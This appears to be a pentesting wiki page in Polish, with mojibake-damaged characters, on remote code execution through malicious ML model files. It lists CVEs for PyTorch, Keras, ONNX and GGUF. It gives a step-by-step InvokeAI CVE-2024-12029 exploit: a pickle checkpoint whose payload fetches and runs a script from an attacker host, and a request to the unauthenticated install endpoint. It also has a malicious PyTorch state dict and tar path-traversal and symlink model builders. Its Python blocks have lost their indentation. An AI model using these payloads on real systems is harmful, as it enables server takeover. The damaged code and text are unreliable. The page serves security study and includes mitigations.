# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## ≈Åadowanie modeli do RCE

Modele uczenia maszynowego sƒÖ zazwyczaj udostƒôpniane w r√≥≈ºnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Modele te mogƒÖ byƒá ≈Çadowane na maszyny deweloper√≥w lub systemy produkcyjne w celu ich wykorzystania. Zazwyczaj modele nie powinny zawieraƒá z≈Ço≈õliwego kodu, ale sƒÖ przypadki, w kt√≥rych model mo≈ºe byƒá u≈ºyty do wykonania dowolnego kodu w systemie jako zamierzona funkcja lub z powodu luki w bibliotece ≈ÇadujƒÖcej model.

W momencie pisania, oto kilka przyk≈Çad√≥w tego typu luk:

| **Framework / Narzƒôdzie**   | **Luka (CVE, je≈õli dostƒôpne)**                                                                                               | **Wektor RCE**                                                                                                                        | **Odno≈õniki**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                          | Z≈Ço≈õliwy pickle w punkcie kontrolnym modelu prowadzi do wykonania kodu (obej≈õcie zabezpieczenia `weights_only`)                       | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + z≈Ço≈õliwe pobieranie modelu powoduje wykonanie kodu; deserializacja RCE w API zarzƒÖdzania                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                               | ≈Åadowanie modelu z YAML u≈ºywa `yaml.unsafe_load` (wykonanie kodu) <br> ≈Åadowanie modelu z warstwƒÖ **Lambda** uruchamia dowolny kod Pythona | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Opracowany model `.tflite` wywo≈Çuje przepe≈Çnienie ca≈Çkowite ‚Üí uszkodzenie sterty (potencjalne RCE)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | ≈Åadowanie modelu za pomocƒÖ `joblib.load` wykonuje pickle z ≈Çadunkiem `__reduce__` atakujƒÖcego                                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *kwestionowane*                                                                  | Domy≈õlnie `numpy.load` pozwala≈Ço na ≈Çadowanie zserializowanych tablic obiekt√≥w ‚Äì z≈Ço≈õliwe `.npy/.npz` wywo≈Çuje wykonanie kodu        | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (przechodzenie katalog√≥w) <br> **CVE-2024-5187** (przechodzenie tar)                                      | ≈öcie≈ºka zewnƒôtrznych wag modelu ONNX mo≈ºe uciec z katalogu (odczyt dowolnych plik√≥w) <br> Z≈Ço≈õliwy model ONNX tar mo≈ºe nadpisaƒá dowolne pliki (prowadzƒÖc do RCE) | |
| ONNX Runtime (ryzyko projektowe) | *(Brak CVE)* niestandardowe operacje ONNX / przep≈Çyw sterowania                                                            | Model z niestandardowym operatorem wymaga za≈Çadowania natywnego kodu atakujƒÖcego; z≈Ço≈ºone grafy modelu nadu≈ºywajƒÖ logiki do wykonania niezamierzonych oblicze≈Ñ | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (przechodzenie ≈õcie≈ºek)                                                                                   | U≈ºycie API ≈Çadowania modelu z w≈ÇƒÖczonym `--model-control` pozwala na przechodzenie ≈õcie≈ºek wzglƒôdnych do zapisywania plik√≥w (np. nadpisanie `.bashrc` dla RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 ‚Ä¶ 25668** (wiele przepe≈Çnie≈Ñ sterty)                                                                        | ≈πle sformatowany plik modelu GGUF powoduje przepe≈Çnienia bufora sterty w parserze, umo≈ºliwiajƒÖc wykonanie dowolnego kodu na systemie ofiary | |
| **Keras (starsze formaty)** | *(Brak nowego CVE)* Legacy model Keras H5                                                                                     | Z≈Ço≈õliwy model HDF5 (`.h5`) z kodem warstwy Lambda nadal wykonuje siƒô podczas ≈Çadowania (tryb bezpiecze≈Ñstwa Keras nie obejmuje starego formatu ‚Äì ‚Äûatak degradacyjny‚Äù) | |
| **Inne** (og√≥lnie)          | *Wada projektowa* ‚Äì serializacja Pickle                                                                                      | Wiele narzƒôdzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, chyba ≈ºe zostanie to z≈Çagodzone | |

Ponadto istniejƒÖ modele oparte na python pickle, takie jak te u≈ºywane przez [PyTorch](https://github.com/pytorch/pytorch/security), kt√≥re mogƒÖ byƒá u≈ºyte do wykonania dowolnego kodu w systemie, je≈õli nie sƒÖ ≈Çadowane z `weights_only=True`. Tak wiƒôc, ka≈ºdy model oparty na pickle mo≈ºe byƒá szczeg√≥lnie podatny na tego typu ataki, nawet je≈õli nie sƒÖ wymienione w powy≈ºszej tabeli.

### üÜï  InvokeAI RCE przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny interfejs webowy open-source dla Stable-Diffusion. Wersje **5.3.1 ‚Äì 5.4.2** udostƒôpniajƒÖ punkt ko≈Ñcowy REST `/api/v2/models/install`, kt√≥ry pozwala u≈ºytkownikom pobieraƒá i ≈Çadowaƒá modele z dowolnych adres√≥w URL.

WewnƒÖtrz punkt ko≈Ñcowy ostatecznie wywo≈Çuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kiedy dostarczony plik to **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **deserializacjƒô pickle**. Poniewa≈º zawarto≈õƒá pochodzi bezpo≈õrednio z kontrolowanego przez u≈ºytkownika URL, atakujƒÖcy mo≈ºe osadziƒá z≈Ço≈õliwy obiekt z niestandardowƒÖ metodƒÖ `__reduce__` wewnƒÖtrz checkpointu; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **zdalnego wykonania kodu (RCE)** na serwerze InvokeAI.

Luka zosta≈Ça przypisana **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Przewodnik po eksploatacji

1. Stw√≥rz z≈Ço≈õliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` na serwerze HTTP, kt√≥ry kontrolujesz (np. `http://ATTACKER/payload.ckpt`).
3. Wywo≈Çaj podatny punkt ko≈Ñcowy (brak wymaga≈Ñ dotyczƒÖcych uwierzytelnienia):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kiedy InvokeAI pobiera plik, wywo≈Çuje `torch.load()` ‚Üí uruchamia siƒô gad≈ºet `os.system`, a atakujƒÖcy uzyskuje wykonanie kodu w kontek≈õcie procesu InvokeAI.

Gotowy exploit: **Metasploit** modu≈Ç `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje ca≈Çy proces.

#### Warunki

‚Ä¢  InvokeAI 5.3.1-5.4.2 (domy≈õlna flaga skanowania **false**)
‚Ä¢  `/api/v2/models/install` dostƒôpne dla atakujƒÖcego
‚Ä¢  Proces ma uprawnienia do wykonywania polece≈Ñ pow≈Çoki

#### ≈Åagodzenia

* Uaktualnij do **InvokeAI ‚â• 5.4.3** ‚Äì ≈Çatka ustawia `scan=True` domy≈õlnie i przeprowadza skanowanie z≈Ço≈õliwego oprogramowania przed deserializacjƒÖ.
* Podczas programowego ≈Çadowania punkt√≥w kontrolnych u≈ºywaj `torch.load(file, weights_only=True)` lub nowego [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomocnika.
* Wymuszaj listy dozwolone / podpisy dla ≈∫r√≥de≈Ç modeli i uruchamiaj us≈Çugƒô z minimalnymi uprawnieniami.

> ‚ö†Ô∏è Pamiƒôtaj, ≈ºe **jakikolwiek** format oparty na Python pickle (w tym wiele plik√≥w `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych ≈∫r√≥de≈Ç.

---

Przyk≈Çad ad-hoc ≈Çagodzenia, je≈õli musisz utrzymaƒá starsze wersje InvokeAI dzia≈ÇajƒÖce za odwrotnym proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Przyk≈Çad ‚Äì tworzenie z≈Ço≈õliwego modelu PyTorch

- Stw√≥rz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Za≈Çaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modele do przej≈õcia ≈õcie≈ºki

Jak wspomniano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), wiƒôkszo≈õƒá format√≥w modeli u≈ºywanych przez r√≥≈ºne frameworki AI opiera siƒô na archiwach, zazwyczaj `.zip`. Dlatego mo≈ºe byƒá mo≈ºliwe nadu≈ºycie tych format√≥w do przeprowadzania atak√≥w typu path traversal, co pozwala na odczyt dowolnych plik√≥w z systemu, w kt√≥rym model jest za≈Çadowany.

Na przyk≈Çad, za pomocƒÖ poni≈ºszego kodu mo≈ºesz stworzyƒá model, kt√≥ry utworzy plik w katalogu `/tmp` po za≈Çadowaniu:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Lub, za pomocƒÖ poni≈ºszego kodu mo≈ºesz stworzyƒá model, kt√≥ry utworzy symlink do katalogu `/tmp`, gdy zostanie za≈Çadowany:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Odniesienia

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
